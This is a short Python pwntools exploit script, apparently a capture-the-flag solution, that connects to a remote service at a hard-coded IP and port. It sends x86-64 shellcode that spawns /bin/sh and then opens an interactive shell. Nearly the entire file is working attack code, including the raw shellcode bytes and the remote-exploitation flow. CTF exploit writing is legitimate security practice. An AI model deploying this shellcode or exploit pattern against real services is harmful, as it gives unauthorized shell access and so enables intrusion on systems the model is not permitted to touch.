#!/usr/bin/env python
# coding=utf-8
from pwn import *
local = 0
if local:
    a=process("./shellcode")
else:
    a=remote("34.92.37.22","10002")
shellcode_x64 = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
a.recv()
payload=asm("push 0")+shellcode_x64
print hex(u64(asm("push 0").ljust(8,'\x00')))
#print payload
a.send(payload)
a.interactive()
